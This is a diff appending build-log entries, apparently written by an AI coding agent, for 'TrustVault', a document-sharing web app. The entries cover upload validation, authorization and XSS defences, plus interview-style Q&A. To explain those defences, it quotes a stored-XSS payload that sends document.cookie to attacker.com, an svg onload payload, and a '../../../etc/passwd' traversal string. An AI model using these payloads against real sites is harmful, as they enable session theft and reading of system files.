+   - Any logic running in the browser is under the complete control of the user. An attacker can inspect source code, modify React state in React DevTools, or execute arbitrary HTTP requests in the browser console or via `curl`.
+   - Therefore, hiding a "Delete" button or an "Admin Console" link provides zero security—it is merely a user experience convenience.
+2. **End-to-End Enforcement in TrustVault:**
+   - While the `Navbar` conditionally renders the `/admin` link for `admin` roles, navigating directly to `/api/admin` without administrative credentials returns HTTP 404 from the server.
+   - Similarly, if an unauthorized user crafts a `DELETE /api/documents/:id` request with a valid CSRF token, `documentService.deleteDocument()` calls `authorize(user, doc, 'delete')` in `src/authz.js`. The server queries the database, determines non-ownership, rejects the request with HTTP 404, leaves database state untouched, and logs an `ACCESS_DENIED` audit record.
+   - Security is 100% enforced on the server; the UI is simply an accessible presentation layer.
+
+---
+
+## Build Entry: Project Structure Reorganization — Dedicated `/backend` Directory
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- Separated the backend application into a dedicated [`/backend`](file:///c:/Users/jithe/coding/TrustValut/backend) directory, creating clean project boundaries alongside [`/client`](file:///c:/Users/jithe/coding/TrustValut/client).
+- Moved `src/`, `tests/`, `scripts/`, `storage/`, `node_modules/`, `package.json`, `package-lock.json`, `.env`, `.env.example`, and `docker-compose.yml` into `backend/`.
+- Configured root `package.json` with delegation scripts (`npm test`, `npm run dev`, `npm run seed`, `npm start`, `npm run client:dev`, `npm run client:build`) targeting respective directories.
+- Confirmed all 12 test suites (198 tests) pass with zero errors in both `backend/` and via root delegation.
+
+---
+
+## Build Entry: Documents Page — Accessible Table, Upload Form & Server Validation Feedback
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- Built the interactive, high-security **Documents Page** in [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx).
+- Implemented the **Accessible Documents Table** displaying all files the current authenticated user is authorized to access:
+  - Columns: **Name** (with original filename and plain-text tag pills), **Category** (with visual badge), **Owner** (populated email or "⭐ You" indicator), and **Date** (localized ISO creation date).
+  - Row actions: Secure download via backend route and owner-only soft-delete button.
+- Implemented the **Integrated Upload Form**:
+  - Fields: **File Picker** (drag-and-drop zone with dynamic preview and size counter), **Document Name** (auto-prefilled from filename, editable), **Category** (dropdown: general, financial, legal, technical, confidential), and **Tags** (comma-separated text input parsed into tags array).
+  - Seamless form toggle button to show/hide the upload card.
+- Implemented **Comprehensive Server Validation Error Reporting**:
+  - Prominent visual alert box displaying categorized server validation failures:
+    - **Wrong File Type:** Highlights non-whitelisted MIME types or extension-spoofing attempts with corrective hints.
+    - **File Too Large:** Catches payloads exceeding the strict 5 MB ceiling with size limits.
+    - **Empty File:** Flags zero-byte files.
+    - **Path Traversal:** Flags attempted directory traversal sequences in original filenames.
+  - Displays the raw server response alongside helpful remediation guidance.
+- Updated backend upload handling in [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) to accept `name`, `category`, and parsed `tags` from `req.body`.
+- Enhanced [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) to populate `owner.email` in document listings for user-friendly ownership rendering.
+- Polished styling in [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css) adhering strictly to Vanilla CSS, modern dark mode glassmorphism, responsive grid layout, and accessible contrast.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Action | Purpose |
+|---|---|---|
+| [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx) | Modified | Document table, inline upload form, and server error categorization logic. |
+| [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css) | Modified | CSS rules for upload card, validation alert box, form grid, tag pills, and table indicators. |
+| [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) | Modified | Forwarded custom `name`, `category`, and `tags` from `req.body` into `documentService.createDocument`. |
+| [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) | Modified | Added `.populate('owner', 'email')` to `listDocuments` so document owner email is available in the UI. |
+| [`docs/BUILD_LOG.md`](file:///c:/Users/jithe/coding/TrustValut/docs/BUILD_LOG.md) | Modified | Appended this technical build log entry. |
+
+---
+
+### 3. Why This Design
+- **Single-Screen Workflow:** Combining the accessible documents table and the upload form on one page reduces navigation friction. Users can immediately upload a file, watch the progress indicator, and see the newly minted document appear at the top of the table without a page reload.
+- **Client-Side Categorization of Server Feedback:** Rather than hiding server errors behind a generic "Upload Failed" toast, `parseServerValidationError()` parses HTTP status codes (400, 413) and error strings returned by Express (`file-type` verification, `multer` size limits, zero-byte checks). This delivers actionable security feedback (e.g., explaining magic-byte mismatch on spoofed files) while keeping backend validation as the single source of truth.
+- **Strict Plain-Text Tag & Name Rendering:** In accordance with `RULES.md`, document titles and tags are rendered as plain text within standard JSX elements (`<div>{doc.name}</div>`, `<span>#{tag}</span>`). `dangerouslySetInnerHTML` is never used, completely neutralizing Stored XSS attacks via malicious filenames or tags.
+- **Backend-Routed Downloads Only:** Documents are never exposed via public static directories or direct file URLs. The table's download action triggers `handleDownload()`, which requests `/api/documents/:id/download`. This guarantees that `authorize(user, doc, 'read')` executes on every download request before streaming bytes.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Unrestricted File Upload & Remote Code Execution (CWE-434):**
+   - The UI guides users toward allowed document formats (PDF, JPEG, PNG, WEBP). On the server, `multer` enforces file extension constraints, and `file-type` inspects binary magic bytes, preventing `.php`, `.jsp`, or executable scripts disguised with fake extensions from ever entering disk storage.
+2. **Denial of Service via Storage & Memory Exhaustion (CWE-400 / CWE-770):**
+   - Both client-side feedback and backend limits restrict file sizes to 5 MB (`limits: { fileSize: 5 * 1024 * 1024 }`), stopping resource exhaustion attacks and memory spikes during SHA-256 calculation.
+3. **Zero-Byte File Cluttering / Descriptor Leaks:**
+   - Empty files (0 bytes) are rejected both by server validation (`Empty files are not allowed`) and immediately surfaced in the UI error box, preventing database clutter and wasted storage metadata.
+4. **Path Traversal via Filename Manipulation (CWE-22):**
+   - Malicious filenames containing directory traversal sequences (e.g. `../../../etc/passwd`) are detected and rejected on the server with status 400. The UI catches this error and warns the user with a "Security Violation: Path Traversal Detected" banner.
+5. **Stored Cross-Site Scripting (XSS / CWE-79):**
+   - All user-supplied metadata—including document names, tags, and categories—are rendered purely as plain-text text nodes, completely preventing `<script>` or event handler injection.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why must file validation rely on magic bytes (file signatures) rather than MIME types sent in HTTP headers or file extensions, and how does TrustVault handle validation errors?
+**Answer:**
+1. **The Flaw of Client-Provided Metadata:**
+   - The MIME type sent in the `Content-Type` header (e.g., `image/png`) and the file extension (e.g., `.png`) are untrusted user input supplied directly by the HTTP client. An attacker can rename a malicious executable or web shell (`shell.php`) to `invoice.pdf` or manually craft an HTTP request setting `Content-Type: application/pdf`.
+2. **Magic Byte Verification:**
+   - File signatures ("magic bytes") are fixed hexadecimal byte sequences at the very beginning of a file (e.g., `%PDF-` or `25 50 44 46` for PDF; `FF D8 FF` for JPEG; `89 50 4E 47` for PNG).
+   - In TrustVault, `documentService` reads the file buffer using the `file-type` package, which inspects these binary signatures directly. If an attacker submits a PHP script renamed to `.png`, `fileTypeFromBuffer` detects the discrepancy and rejects the upload with HTTP 400: *"File content does not match declared type (spoofed extension)"*.
+3. **UI Feedback Architecture:**
+   - When Express rejects the upload, `DocumentsPage` captures the HTTP 400 response, categorizes the failure under `Validation Failed: Wrong File Type`, and displays the exact reason along with security hints without crashing the application.
+
+#### Question 2: Why should document downloads always route through an authenticated backend handler rather than linking directly to static files stored on disk or a public CDN bucket?
+**Answer:**
+1. **Broken Object Level Authorization (BOLA / IDOR):**
+   - If files are served statically from a web server or public S3 bucket (e.g., `/static/uploads/report.pdf`), anyone who obtains or guesses the file path can download the document directly, completely bypassing authentication and role-based access control.
+2. **Dynamic Permission Verification:**
+   - In TrustVault, permission grants can be revoked at any time by the document owner. Serving files through `/api/documents/:id/download` guarantees that:
+     - The user session is verified.
+     - `authorize(user, doc, 'read')` queries the database in real time with zero caching.
+     - If the user's permission was revoked, the request returns HTTP 404 (cloaking existence).
+     - Every successful or denied download attempt is recorded in the tamper-evident `AuditEvent` hash chain.
+3. **Safe Storage Isolation:**
+   - Files are stored on disk in a private directory outside the web root (`backend/storage/`) using random UUIDs rather than original filenames, eliminating direct path traversal or execution risks.
+
+#### Question 3: How does rendering tags and filenames as plain text in React prevent Stored Cross-Site Scripting (XSS), and why is `dangerouslySetInnerHTML` forbidden?
+**Answer:**
+1. **Stored XSS Attack Vector:**
+   - An attacker might upload a file named `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>` or add a tag `<svg onload=alert(1)>`. If the application renders this string inside the DOM using `element.innerHTML` or React's `dangerouslySetInnerHTML`, the browser parses the HTML tags and executes the malicious JavaScript payload in the context of any user viewing the documents list.
+2. **React's Safe Default Escaping:**
+   - Standard JSX expressions like `<div>{doc.name}</div>` and `<span>#{tag}</span>` treat variables as string literals. React converts characters like `<`, `>`, `&`, `"`, and `'` into their safe HTML entity representations (`&lt;`, `&gt;`), ensuring the browser renders them strictly as visual text rather than executable markup.
+3. **TrustVault Defense:**
+   - TrustVault strictly forbids `dangerouslySetInnerHTML` throughout the entire codebase, ensuring that even if an attacker manages to store a malicious payload in a document title or tag, it is harmlessly rendered as plain text.
+
+
+
+
+
+
+
+
 
 
 
